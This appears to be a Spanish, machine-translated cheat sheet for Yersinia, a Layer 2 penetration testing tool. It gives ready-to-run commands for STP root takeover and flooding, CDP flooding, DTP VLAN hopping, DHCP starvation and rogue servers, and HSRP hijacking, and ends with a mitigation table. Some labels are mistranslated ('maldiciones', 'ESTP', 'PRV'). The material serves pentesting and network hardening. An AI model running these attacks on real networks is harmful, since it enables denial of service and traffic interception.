<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Hoja de referencia de Yersinia

[Yersinia](https://github.com/tomac/yersinia) es un potente marco de prueba de penetración de red de Capa 2 (capa de enlace de datos) diseñado para analizar y explotar las debilidades en los protocolos de Capa 2 como STP (Protocolo de árbol de expansión), CDP (Protocolo de descubrimiento de Cisco), DTP (Protocolo de enlace dinámico), DHCP, HSRP y enlace troncal VLAN 802.1Q.

---

## Tabla de contenidos

- [Protocolos y modos compatibles](#protocolos-compatibles--modos)
- [Instalación](#instalación)
- [Modo de maldiciones interactivas (`-I`)](#interactive-curses-mode--i)
- [Ataques del protocolo de árbol de expansión (STP)](#ataques-de-protocolo-de-árbol-de-spanning-stp)
- [Ataques del Protocolo de descubrimiento de Cisco (CDP)](#cisco-discovery-protocol-cdp-attacks)
- [Protocolo de enlace troncal dinámico (DTP) y salto de VLAN](#dynamic-trunking-protocol-dtp--vlan-hopping)
- [DHCP Rogue y ataques de hambre](#dhcp-rogue--starvation-attacks)
- [Secuestro de HSRP y VRRP] (#hsrp--vrrp-hijacking)
- [Mitigación y endurecimiento](#mitigación--endurecimiento)

---

## Protocolos y modos admitidos

Yersinia apunta a protocolos que operan bajo IP:
- **STP:** Protocolo de árbol de expansión (adquisición de rol de puente raíz, notificaciones de cambio de topología).
- **CDP:** Cisco Discovery Protocol (inundación de dispositivos, inyección de vecinos falsos).
- **DTP:** Protocolo de Trunking Dinámico (Negociación de enlaces troncales para acceder a todas las VLAN).
- **DHCP:** Protocolo de configuración dinámica de host (servidores DHCP inactivos y no autorizados).
- **HSRP:** Protocolo de enrutador Hot Standby (adquisición de puerta de enlace activa).
- **802.1Q / 802.1X:** Salto de VLAN Dot1Q y agotamiento de EAPOL.
- **VTP:** Protocolo VLAN Trunking (eliminación/sobrescritura de base de datos VLAN).

Modos de ejecución:
- **`-I` (Maldiciones interactivas):** Interfaz de usuario de terminal de pantalla completa para seleccionar protocolos, configurar ataques y monitorear paquetes en vivo.
- **CLI no interactiva:** Ejecución directa de scripts automatizados.

---

## Instalación
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Run in terminal
yersinia -h
```
---

## Modo de maldiciones interactivas (`-I`)

La forma más práctica y segura de usar Yersinia en la terminal sin GUI:
```bash
sudo yersinia -I
```
- **`h`**: muestra ayuda y combinaciones de teclas.
- **`g`**: Protocolos de conmutación (STP, CDP, DTP, DHCP, HSRP, etc.).
- **`x`**: Ejecutar menú de ataque para el protocolo actual.
- **`c`**: Cancelar ataque en ejecución.
- **`l`**: alternar el registro de paquetes.
- **`q`**: Salida de Yersinia.

---

## Ataques del protocolo de árbol de expansión (STP)

STP elige un puente raíz con el ID de puente más bajo (Prioridad + MAC). Yersinia puede inyectar BPDU (Unidades de datos de protocolo de puente) falsas para reclamar el estado de raíz y redirigir el tráfico a través del host del atacante.

### 1. Reclamar rol raíz (inyección de BPDU)
Envíe BPDU con prioridad `0` y una dirección MAC inferior para convertirse en el puente raíz STP:
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. Reclamar rol raíz con cambio de topología (TCN)
Forzar a todos los conmutadores a vaciar las tablas CAM y volver a converger a través del atacante:
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. Ataque STP DoS (BPDU de configuración de inundación)
Falla o satura la CPU del switch con tramas BPDU masivas en conflicto:
```bash
sudo yersinia stp -attack 0 -i eth0
```
---

## Ataques del Protocolo de descubrimiento de Cisco (CDP)

CDP comparte nombres de dispositivos, modelos, capacidades y versiones de software sin autenticar entre dispositivos Cisco.

### 1. Inundación de vecinos falsos del CDP
Agote la memoria del interruptor y cree dispositivos fantasma en `show cdp neighbors`:
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. Capture e inspeccione paquetes CDP legítimos
Ejecute el modo de curses interactivo (`yersinia -I`), presione `g`, seleccione `CDP` y observe el nombre de host del conmutador, la IP de administración, el modelo de hardware y la ID de VLAN nativa.

---

## Protocolo de enlace troncal dinámico (DTP) y salto de VLAN

DTP negocia automáticamente enlaces troncales si los puertos del switch están configurados en modo `dynamic desirable` o `dynamic auto`.

### 1. Negociar enlace troncal (paquete DTP deseable)
Engañe al puerto del switch para que se convierta en una troncal 802.1Q:
```bash
sudo yersinia dtp -attack 0 -i eth0
```
Una vez que se negocia la troncal, capture tramas de todas las VLAN o etiquete paquetes en subredes aisladas utilizando interfaces Linux 802.1Q:
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```
---

## DHCP ataques deshonestos y de hambre

### 1. Ataque de inanición de DHCP (grupo de IP de escape)
Envíe miles de solicitudes DHCP DISCOVER con direcciones MAC aleatorias para consumir todas las direcciones IP disponibles en el grupo:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. Configurar un servidor DHCP no autorizado
Implemente un servidor DHCP no autorizado con DNS y puerta de enlace personalizados:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```
---

## Secuestro de HSRP y VRRP

HSRP permite que varios enrutadores presenten una única puerta de enlace virtual predeterminada.

### 1. Reclamar prioridad del enrutador activo
Inyecte paquetes HSRP HELLO con prioridad 255 para hacerse cargo de la IP de la puerta de enlace predeterminada:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```
---

## Mitigación y endurecimiento

| Protocolo | Vector de ataque | Cisco / Mitigación estándar |
|---|---|---|
| **ESTP** | Inyección de puente de raíz falso | `spanning-tree bpduguard enable` en puertos de acceso; `spanning-tree rootguard` en enlaces entre conmutadores. |
| **DTP** | Negociación de troncos rebeldes | `switchport mode access` y `switchport nonegotiate` en todos los puertos de acceso de cara al usuario. |
| **CDP** | Inundaciones / Divulgación de información | `no cdp run` (globalmente) o `no cdp enable` en puertos de interfaz que no son de confianza. |
| **DHCP** | Servidor hambriento y deshonesto | Habilite `ip dhcp snooping`, limite la velocidad por puerto, configure puertos de enlace ascendente confiables. |
| **PRV** | Secuestro de prioridad | Configure la autenticación MD5 con claves secretas (`standby 1 authentication md5 key-string <SECRET>`). |